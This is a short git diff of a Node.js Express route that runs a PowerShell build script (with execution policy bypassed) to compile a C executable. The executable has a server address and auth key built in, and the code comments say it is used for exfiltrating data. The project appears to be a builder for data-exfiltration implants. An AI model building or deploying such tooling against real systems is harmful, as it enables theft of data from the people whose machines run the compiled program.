@@ -38,8 +38,8 @@ getReqRouter.get("/", (request, response, next) => {
 
     // We're using the JSON in EXE_DATA to prevent external machines from trying to run a file inclusion attack
     let reqEXEData = EXE_DATA[request.headers.exe];
-
-    if (EXE_DATA[request.headers.exe])
+    
+    if (reqEXEData)
     {
         // The gist is: the compiling script has already been made for you in ./make.ps1
         // All we gotta do now is spawn a system process to run it.
@@ -57,13 +57,16 @@ getReqRouter.get("/", (request, response, next) => {
             // Now, compile the GCC with a newly generated POST Authkey (if necessary) that will be used to when exfiltrating data
             // Spawning subprocesses is always very dangerous, but we mitigate this by not spawning a shell and basically having prepared statements
             // See auth.js for more about how the Authentication is designed
-
+            
+            // `${path.resolve(__dirname, reqEXEData.cDir, "./make.ps1")}`,
             execFileSync("powershell.exe", [
                 `-ExecutionPolicy`, `Bypass`, 
-                `-File`, `${path.resolve(this.cDir, "./make.ps1")}`, 
+                `-File`,  `./make.ps1`,
                 `-SVL_ADDRESS`, `${IP}`,
                 `-SVL_AUTHKEY`, `${authKey}`
-            ]);
+            ], {
+                cwd: path.resolve(__dirname, reqEXEData.cDir)
+            });
 
             logging.log(`C file ${reqEXEData.cPath} from ${request.ip} compiled!`);
         }
